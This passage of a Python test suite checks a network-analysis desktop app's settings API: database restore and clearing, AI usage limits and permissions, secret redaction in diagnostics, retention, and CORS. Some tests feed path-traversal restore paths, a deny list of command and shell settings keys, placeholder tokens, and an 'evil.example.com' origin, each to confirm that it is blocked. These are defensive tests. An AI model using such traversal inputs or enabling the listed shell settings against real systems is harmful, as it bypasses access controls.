    assert client.post("/api/settings/database/restore", json={"source": str(out)}).status_code == 400            # confirmation
    restored = client.post("/api/settings/database/restore", json={"source": str(out), "confirm": True})
    assert restored.status_code == 200 and database_admin.info()["reports"] == 1 and (db.parent / "backups").is_dir()

    assert client.post("/api/settings/database/backup", json={"destination": str(db.parent / "x.sqlite3")}).status_code == 400
    for bad in (tmp_path / "out" / "text.sqlite3",):
        bad.write_text("this is not a database")
        r = client.post("/api/settings/database/restore", json={"source": str(bad), "confirm": True})
        assert r.status_code == 400 and r.json()["detail"]["code"] == "invalid_backup"
    for src in ("relative.db", f"{tmp_path}/../x.db"):
        assert client.post("/api/settings/database/restore", json={"source": src, "confirm": True}).status_code == 400
    newer = tmp_path / "out" / "newer.sqlite3"
    c = sqlite3.connect(newer)
    c.execute("CREATE TABLE x(a)")
    c.execute("PRAGMA user_version = 999")
    c.commit()
    c.close()
    assert "newer" in client.post("/api/settings/database/restore", json={"source": str(newer), "confirm": True}).json()["detail"]["message"]

    cap = aged(capture_library, "keep.pcap", 1, "ANALYZED")
    assert client.post("/api/settings/database/clear", json={"reports": True}).status_code == 400
    cleared = client.post("/api/settings/database/clear", json={"reports": True, "confirm": True}).json()
    assert cleared["reports"] == 1 and cleared["capture_summaries"] == 1 and cleared["captures_deleted"] == 0
    assert capture_library.get(cap.id).status == "COMPLETED" and capture_library.path_of(cap).exists()   # the PCAP file is untouched
    client.post("/api/settings/database/clear", json={"delete_capture_files": True, "confirm": True})
    assert capture_library.get(cap.id) is None and not capture_library.path_of(cap).exists()              # only on explicit request


# ================================================================== AI usage, limits and safety switches
class CountingSdk:
    def __init__(self):
        self.calls = 0
        self.models = self

    def generate_content(self, **kw):
        self.calls += 1
        return type("R", (), {"text": json.dumps({"ok": True}), "parsed": None, "candidates": [], "usage_metadata": None})()


def gate_call(usage, text, calls):
    from app.ai.provider import ProviderResponse

    def call():
        calls.append(1)
        return ProviderResponse(data={"n": len(calls)}, model="m")

    return usage.run(text, call)


def test_identical_requests_are_cached_and_counted_separately(svc):
    usage, calls = au.get_ai_usage(), []
    a, b, c = gate_call(usage, "same", calls), gate_call(usage, "same", calls), gate_call(usage, "different", calls)
    assert a.data == b.data and c.data != a.data and len(calls) == 2
    t = usage.today()
    assert (t["requests"], t["cached"]) == (2, 1)
    svc.update({"ai_usage": {"cache_enabled": False}})
    gate_call(usage, "same", calls)
    assert len(calls) == 3


def test_the_daily_limit_blocks_requests_without_calling_the_provider(svc):
    from app.ai.provider import DailyLimitReachedError

    svc.update({"ai_usage": {"daily_limit": 2, "cache_enabled": False}})
    usage, calls = au.get_ai_usage(), []
    gate_call(usage, "1", calls)
    gate_call(usage, "2", calls)
    with pytest.raises(DailyLimitReachedError) as e:
        gate_call(usage, "3", calls)
    assert len(calls) == 2 and "daily AI request limit (2)" in e.value.message and usage.today()["blocked"] == 1
    svc.update({"ai_usage": {"daily_limit": 0}})                                               # 0 = no limit
    gate_call(usage, "3", calls)
    assert len(calls) == 3


def test_turning_ai_off_blocks_every_request_and_the_investigation_falls_back_to_local(svc, make_pcap, history):
    from app.ai.gemini_client import GeminiClient
    from app.ai.provider import AiDisabledError
    from app.services.network_investigation import run_investigation
    from app.ai.network_health import NetworkInvestigator

    svc.update({"security": {"allow_ai": False}})
    sdk = CountingSdk()
    client = GeminiClient(settings=get_ai_settings(), sdk_client=sdk, usage=au.get_ai_usage())
    with pytest.raises(AiDisabledError):
        client.generate_structured(system_instruction="s", user_content="u", response_schema=type("S", (), {}))
    assert sdk.calls == 0
    r = result_of(make_pcap, site("a.example.com", "151.101.1.1", pf.T0, 40000))
    out = run_investigation(r, [], history, investigator_factory=lambda: NetworkInvestigator(client))
    assert out.status == "local_only" and out.ai.error_code == "ai_disabled" and out.local.metrics


def test_model_and_timeout_settings_override_the_environment(svc, monkeypatch):
    monkeypatch.setenv("GEMINI_MODEL", "env-model")
    assert get_ai_settings().gemini_model == "env-model"
    svc.update({"ai": {"model": "gemini-custom-1", "timeout_seconds": 90}})
    cfg = get_ai_settings()
    assert cfg.gemini_model == "gemini-custom-1" and cfg.gemini_timeout_seconds == 90.0


def test_live_auto_investigation_follows_the_severity_switches_and_the_daily_budget(svc, capture_library):
    svc.update({"ai": {"auto_high": False, "auto_critical": False, "auto_medium": False}})
    inv = FakeInvestigator()
    mgr, src, _ = make_manager(investigator=inv)
    mgr.start(StartRequest(interface=IFACE.name, confirm=True, auto_investigate=True))
    src.emit(scan(150))
    mgr.analyze_now()
    time.sleep(0.2)
    assert inv.calls == [] and mgr.status().findings                                          # findings exist but no severity is allowed
    mgr.stop()

    svc.reset("ai")
    svc.update({"ai_usage": {"max_auto_per_day": 0}})
    budget_inv = FakeInvestigator()
    mgr, src, _ = make_manager(investigator=budget_inv)
    mgr._budget = au.get_ai_usage()                                                           # noqa: SLF001
    mgr.start(StartRequest(interface=IFACE.name, confirm=True, auto_investigate=True))
    src.emit(scan(150))
    mgr.analyze_now()
    time.sleep(0.2)
    assert budget_inv.calls == []                                                             # the daily automatic budget is zero
    mgr.stop()
    svc.update({"ai_usage": {"max_auto_per_day": 5}})
    ok_inv = FakeInvestigator()
    mgr, src, _ = make_manager(investigator=ok_inv)
    mgr._budget = au.get_ai_usage()                                                           # noqa: SLF001
    mgr.start(StartRequest(interface=IFACE.name, confirm=True, auto_investigate=True))
    src.emit(scan(150))
    mgr.analyze_now()
    deadline = time.time() + 3
    while time.time() < deadline and not ok_inv.calls:
        time.sleep(0.05)
    assert len(ok_inv.calls) == 1 and au.get_ai_usage().today()["automatic"] == 1
    mgr.stop()


def test_ai_permissions_are_fixed_and_the_data_policy_is_visible(client):
    body = client.get("/api/settings").json()
    assert "Execute commands" in body["ai_permissions"]["never"] and "Modify firewall" in body["ai_permissions"]["never"] and "Delete files" in body["ai_permissions"]["never"]
    assert {p["item"]: p["policy"] for p in body["ai_data_policy"]} == {"Raw PCAP files": "NEVER SENT", "Raw packet payloads": "NEVER SENT",
                                                                       "Structured analysis": "ALLOWED", "Aggregated statistics": "ALLOWED"}
    for forbidden in ("allow_commands", "allow_firewall", "allow_shell", "execute", "ai_tools"):         # nothing in the model can weaken this
        assert forbidden not in json.dumps(body["settings"])
    assert put(client, {"security": {"allow_commands": True}}).status_code == 422
    assert put(client, {"ai": {"send_raw_pcap": True}}).status_code == 422


# ================================================================== diagnostics, logging, about
def test_diagnostic_report_contains_no_secrets_and_redacts_logs(client, tmp_path, monkeypatch):
    client.put("/api/settings/ai/key", json={"api_key": KEY})
    log = tmp_path / "pm.log"
    log.write_text(f"2026 INFO x: calling with api_key={KEY}\n2026 INFO y: Authorization: Bearer abcdefghijklmnop1234\n2026 INFO z: opened /Users/someone/file\n")
    monkeypatch.setattr(env, "log_file", log)
    out = tmp_path / "diag.json"
    r = client.post("/api/settings/diagnostics/export", json={"destination": str(out)})
    assert r.status_code == 200
    text = out.read_text()
    assert KEY not in text and "abcdefghijklmnop1234" not in text and "[redacted]" in text
    report = json.loads(text)
    assert set(report) >= {"about", "settings", "storage", "database", "ai_usage_today", "recent_log_lines"} and "api_key" not in json.dumps(report["settings"])
    assert report["about"]["ai"]["configured"] is True and KEY not in json.dumps(report["about"])


def test_redactor_handles_common_secret_shapes():
    for raw in (f"key {KEY} end", "token=abc123def456", 'password: "hunter22222"', "Authorization: Bearer abcdefghijklmnop12"):
        assert "[redacted]" in diagnostics.redact(raw)
    assert diagnostics.redact("plain line with 10.0.0.1") == "plain line with 10.0.0.1"


def test_log_level_and_saving_follow_the_diagnostics_settings(svc, tmp_path):
    from app.logging_config import _MARK, reconfigure_logging

    log = tmp_path / "logs" / "x.log"
    s = svc.update({"diagnostics": {"log_level": "debug", "save_logs": True, "rotation": False}})
    reconfigure_logging(ec.log_level(s), log, save_logs=True, rotation=False)
    root = logging.getLogger()
    assert root.level == logging.DEBUG and any(isinstance(h, logging.FileHandler) and not hasattr(h, "maxBytes") for h in root.handlers if getattr(h, _MARK, False))
    reconfigure_logging("ERROR", log, save_logs=False)
    assert root.level == logging.ERROR and not any(isinstance(h, logging.FileHandler) for h in root.handlers if getattr(h, _MARK, False))
    reconfigure_logging("INFO", log, save_logs=True, max_bytes=1024 * 1024, rotation=True)
    assert any(isinstance(h, logging.handlers.RotatingFileHandler) and h.maxBytes == 1024 * 1024 for h in root.handlers)
    svc.update({"advanced": {"debug_mode": True}})
    assert ec.log_level() == "DEBUG"


def test_about_reports_versions_and_capabilities(client):
    a = client.get("/api/settings/about").json()
    assert a["app"] == "PacketMind" and a["backend_version"] and a["python"] and "Scapy" in a["analysis_engine"] and "SQLite" in a["database_engine"]
    assert a["ai_provider"] == "Google Gemini" and a["os"] and a["architecture"] and "library_available" in a["capture"] and isinstance(a["tshark"], bool)


def test_notification_settings_round_trip(client):
    s = put(client, {"notifications": {"medium_finding": True, "sound": True, "only_in_background": True, "analysis_error": False}}).json()["settings"]["notifications"]
    assert s["medium_finding"] and s["sound"] and s["only_in_background"] and not s["analysis_error"] and s["critical_finding"]


def test_advanced_worker_count_is_used_when_the_job_manager_is_created(svc, monkeypatch):
    svc.update({"advanced": {"max_concurrent_analyses": 5}})
    monkeypatch.setattr(analyses, "_manager", None)
    mgr = analyses.get_manager()
    assert mgr._pool._max_workers == 5                                                         # noqa: SLF001


# ================================================================== the UI's copies of the model cannot drift
def test_the_ui_fallback_defaults_and_test_payload_match_the_model():
    from pathlib import Path

    from app.api.settings import _CONSTRAINTS
    from app.models.app_settings import UNAVAILABLE

    ui = Path(__file__).resolve().parents[2] / "desktop" / "src"
    assert json.loads((ui / "lib" / "defaultSettings.json").read_text()) == AppSettings().model_dump(mode="json")
    fixture = json.loads((ui / "test" / "settingsPayload.json").read_text())
    assert fixture["defaults"] == AppSettings().model_dump(mode="json") and fixture["constraints"] == json.loads(json.dumps(_CONSTRAINTS))
    assert fixture["unavailable"] == UNAVAILABLE


def test_every_unavailable_control_is_absent_from_the_model_so_it_can_never_be_stored():
    from app.models.app_settings import UNAVAILABLE

    flat = json.dumps(AppSettings().model_dump(mode="json"))
    for items in UNAVAILABLE.values():
        for item in items:
            assert f'"{item["key"]}"' not in flat, item["key"]


# ================================================================== retention
def test_retention_removes_old_reports_and_history_only_when_asked(svc, history, monkeypatch):
    from datetime import datetime, timedelta, timezone

    from sqlalchemy import text

    from app.database import make_engine
    from app.migrations import migrate

    eng = make_engine(f"sqlite:///{svc._engine.url.database}")                           # noqa: SLF001
    monkeypatch.setattr(database_admin, "engine", eng)
    monkeypatch.setattr(database_admin, "get_history", lambda: history)
    old = (datetime.now(timezone.utc) - timedelta(days=100)).isoformat(timespec="seconds")
    with eng.begin() as c:
        for rid, when in (("old", old), ("new", datetime.now(timezone.utc).isoformat(timespec="seconds"))):
            c.execute(text("INSERT INTO reports (id,title,created_at,source_kind,capture_name,finding_count,total_packets,ai_status,schema_version,content) VALUES (:i,'t',:w,'pcap','c',0,0,'not_run',1,'{}')"), {"i": rid, "w": when})
    assert database_admin.prune_by_retention() == {"history_sources": 0, "reports": 0}       # 0 days = keep everything
    svc.update({"privacy": {"data_retention_days": 30}})
    assert database_admin.prune_by_retention()["reports"] == 1
    with eng.connect() as c:
        assert [r[0] for r in c.execute(text("SELECT id FROM reports"))] == ["new"]
    del migrate


# ================================================================== the desktop app is a different origin: CORS must allow every method the UI uses
@pytest.mark.parametrize("origin", ["http://localhost:1420", "http://127.0.0.1:1420", "tauri://localhost", "http://tauri.localhost"])
@pytest.mark.parametrize("method,path", [("PUT", "/api/settings"), ("PUT", "/api/settings/ai/key"), ("POST", "/api/settings/reset"), ("DELETE", "/api/settings/ai/key"),
                                         ("POST", "/api/settings/import"), ("GET", "/api/settings")])
def test_cors_preflight_allows_the_settings_calls_from_the_app(client, origin, method, path):
    r = client.options(path, headers={"Origin": origin, "Access-Control-Request-Method": method, "Access-Control-Request-Headers": "content-type"})
    assert r.status_code == 200 and r.headers["access-control-allow-origin"] == origin and method in r.headers["access-control-allow-methods"]
    assert client.options(path, headers={"Origin": "http://evil.example.com", "Access-Control-Request-Method": method}).status_code == 400   # other sites stay blocked
